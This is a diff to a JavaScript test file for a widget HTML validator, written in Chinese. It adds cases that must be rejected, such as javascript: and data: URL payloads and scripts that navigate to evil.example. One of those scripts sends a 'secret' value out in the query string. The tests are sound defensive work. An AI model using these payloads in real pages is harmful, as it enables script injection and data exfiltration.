@@ -68,6 +68,8 @@ test('html 形态：拒绝文档外壳（外壳由宿主提供）', () => {
     '<!DOCTYPE html><p>x</p>',
     '<head><style>a{}</style></head>',
     '<body>x</body>',
+    '</body>',
+    '</html>',
   ]) {
     const v = validateWidgetArgs({ format: 'html', code });
     assert.ok(!v.ok, `应拒绝：${code}`);
@@ -84,6 +86,26 @@ test('html 形态：拒绝外链脚本与外链资源（网络已禁用，要给
 
   const l = validateWidgetArgs({ format: 'html', code: '<link href="https://evil.example/x.css" rel="stylesheet">' });
   assert.ok(!l.ok && /外部/.test(l.error));
+
+  for (const code of [
+    '<img src=//evil.example/x.png>',
+    '<img src=https://evil.example/x.png>',
+    '<a href=//evil.example/>跳转</a>',
+    '<a href="javascript:alert(1)">执行</a>',
+    '<a href="data:text/html,<script>alert(1)</script>">执行</a>',
+  ]) {
+    const v = validateWidgetArgs({ format: 'html', code });
+    assert.ok(!v.ok && /外部|javascript|data|导航/.test(v.error), `危险资源/导航应拒绝：${code}`);
+  }
+  assert.equal(validateWidgetArgs({ format: 'html', code: '<a href="#step-2">页内</a>' }).ok, true);
+  for (const code of [
+    '<script>location.href = "https://evil.example/?x=" + secret</script>',
+    '<script>window.open("https://evil.example")</script>',
+    '<script>globalThis["location"] = "https://evil.example"</script>',
+  ]) {
+    const v = validateWidgetArgs({ format: 'html', code });
+    assert.ok(!v.ok && /导航|外部/.test(v.error), `脚本导航应拒绝：${code}`);
+  }
 });
 
 test('html 形态：超长被拒；内联 script 不误伤', () => {
